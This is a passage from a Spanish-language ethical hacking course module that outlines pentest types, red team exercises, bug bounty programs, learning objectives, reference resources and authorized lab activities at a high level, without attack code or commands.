   └── Lateral movement

5. Reporting
   ├── Executive summary
   ├── Technical details
   ├── Risk assessment
   └── Remediation roadmap
```

#### Tipos de Penetration Testing
**Por Conocimiento:**
- **Black Box**: Sin conocimiento previo del sistema
- **White Box**: Conocimiento completo del sistema
- **Gray Box**: Conocimiento parcial del sistema

**Por Alcance:**
- **Network Penetration Testing**: Infraestructura de red
- **Web Application Testing**: Aplicaciones web
- **Mobile Application Testing**: Aplicaciones móviles
- **Social Engineering Testing**: Factor humano
- **Physical Security Testing**: Seguridad física

### Red Team Exercises

#### Diferencias Red Team vs Penetration Testing
```
Red Team vs Penetration Testing:
┌─────────────────────┬─────────────────────────────┐
│ Penetration Testing │ Red Team Exercise          │
├─────────────────────┼─────────────────────────────┤
│ Technical focus     │ Business objective focus    │
│ Point-in-time test  │ Continuous assessment       │
│ Known testing       │ Covert operations          │
│ Compliance driven   │ Risk-based approach        │
│ Vulnerability focus │ Attack chain simulation    │
│ Limited scope       │ Organization-wide scope    │
└─────────────────────┴─────────────────────────────┘
```

#### Objetivos de Red Team
**Objetivos Típicos:**
- Simular ataques APT (Advanced Persistent Threat)
- Probar capacidades de detección y respuesta
- Evaluar controles de seguridad en entorno realista
- Medir tiempo de detección (Mean Time to Detection - MTTD)
- Validar procedimientos de respuesta a incidentes

### Bug Bounty Programs

#### Estructura de Bug Bounty
```
Bug Bounty Program Structure:
├── Program Scope
│   ├── In-scope assets
│   ├── Out-of-scope assets
│   ├── Allowed testing methods
│   └── Prohibited activities
├── Reward Structure
│   ├── Critical vulnerabilities ($$$$$)
│   ├── High vulnerabilities ($$$$)
│   ├── Medium vulnerabilities ($$$)
│   └── Low vulnerabilities ($$)
├── Vulnerability Categories
│   ├── Remote code execution
│   ├── SQL injection
│   ├── Cross-site scripting
│   ├── Authentication bypass
│   └── Privilege escalation
└── Disclosure Process
    ├── Vulnerability reporting
    ├── Verification process
    ├── Remediation timeline
    └── Public disclosure
```

#### Plataformas de Bug Bounty
**Plataformas Populares:**
- **HackerOne**: Plataforma líder en bug bounty
- **Bugcrowd**: Crowdsourced security testing
- **Synack**: Red team as a service
- **Cobalt**: Pentest as a service
- **Open Bug Bounty**: Plataforma gratuita

## Objetivos de Aprendizaje
- [ ] Comprender metodologías de hacking ético y malicioso
- [ ] Dominar las 5 fases del proceso de hacking
- [ ] Realizar reconnaissance pasivo y activo
- [ ] Ejecutar scanning y enumeración con herramientas especializadas
- [ ] Implementar exploits de manera controlada y ética
- [ ] Desarrollar técnicas de post-explotación
- [ ] Diseñar e implementar contramedidas efectivas
- [ ] Configurar sistemas de detección y prevención
- [ ] Realizar vulnerability assessments y penetration testing
- [ ] Establecer programas de testing de seguridad

## Recursos Adicionales
### Frameworks y Metodologías
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115 - Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [OSSTMM - Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf)

### Herramientas de Penetration Testing
- [Kali Linux](https://www.kali.org/) - Distribución para pentesting
- [Metasploit Framework](https://www.metasploit.com/) - Platform de explotación
- [Burp Suite](https://portswigger.net/burp) - Web application testing
- [Nmap](https://nmap.org/) - Network discovery y security auditing

### Laboratorios de Práctica
- [VulnHub](https://www.vulnhub.com/) - Máquinas virtuales vulnerables
- [HackTheBox](https://www.hackthebox.eu/) - Plataforma online de pentesting
- [TryHackMe](https://tryhackme.com/) - Aprendizaje interactivo de ciberseguridad
- [OverTheWire](https://overthewire.org/) - Wargames y desafíos

### Certificaciones Relevantes
- **CEH (Certified Ethical Hacker)** - EC-Council
- **OSCP (Offensive Security Certified Professional)** - Offensive Security
- **GPEN (GIAC Penetration Tester)** - SANS Institute
- **CPENT (Certified Penetration Testing Professional)** - EC-Council

## Actividades Prácticas

### Laboratorio 1: Reconnaissance y OSINT
**Objetivo:** Realizar reconnaissance pasivo sobre un objetivo autorizado
**Actividades:**
- Utilizar Google dorking para información pública
- Enumerar subdominios con herramientas automatizadas
- Recopilar información con TheHarvester y Maltego
- Analizar metadatos de documentos públicos
- Documentar hallazgos en formato profesional

### Laboratorio 2: Network Scanning y Enumeration
**Objetivo:** Identificar servicios y vulnerabilidades en red de pruebas
**Actividades:**
- Realizar ping sweep para discovery de hosts
- Ejecutar port scanning con diferentes técnicas de Nmap
- Enumerar servicios con scripts NSE
- Identificar versiones de software y sistemas operativos
- Correlacionar información para mapeo de red

### Laboratorio 3: Vulnerability Assessment
**Objetivo:** Evaluar vulnerabilidades con herramientas automatizadas
**Actividades:**
- Configurar y ejecutar escaneo con OpenVAS
- Analizar resultados de vulnerability assessment
- Verificar manualmente vulnerabilidades críticas
- Priorizar vulnerabilidades por riesgo
- Generar reporte ejecutivo y técnico

### Laboratorio 4: Web Application Testing
**Objetivo:** Identificar vulnerabilidades web en aplicación de prueba
**Actividades:**
- Configurar proxy con Burp Suite
- Realizar spidering y content discovery
- Probar inyecciones SQL con SQLmap
- Identificar y explotar vulnerabilidades XSS
- Documentar cadenas de explotación completas

### Laboratorio 5: Implementación de Contramedidas
**Objetivo:** Configurar controles defensivos efectivos
**Actividades:**
- Configurar firewall con reglas específicas
- Implementar IDS/IPS con Suricata
- Hardening de sistema Linux/Windows
- Configurar monitoreo con ELK Stack
- Probar efectividad de controles implementados

### Ejercicio Integrador: Red Team Exercise
**Objetivo:** Simular ataque APT completo en entorno controlado
**Fases:**
1. **Reconnaissance**: Recopilación de inteligencia
2. **Initial Access**: Compromiso inicial del perímetro
3. **Persistence**: Establecer acceso persistente
4. **Privilege Escalation**: Elevar privilegios en sistemas
5. **Lateral Movement**: Moverse lateralmente en la red
6. **Data Exfiltration**: Simular extracción de datos sensibles
7. **Covering Tracks**: Eliminar evidencias de actividad

**Entregables:**
- Plan de ataque detallado
- Evidencias de cada fase ejecutada
- Reporte técnico completo
- Recomendaciones de mejora
- Presentación ejecutiva de resultados
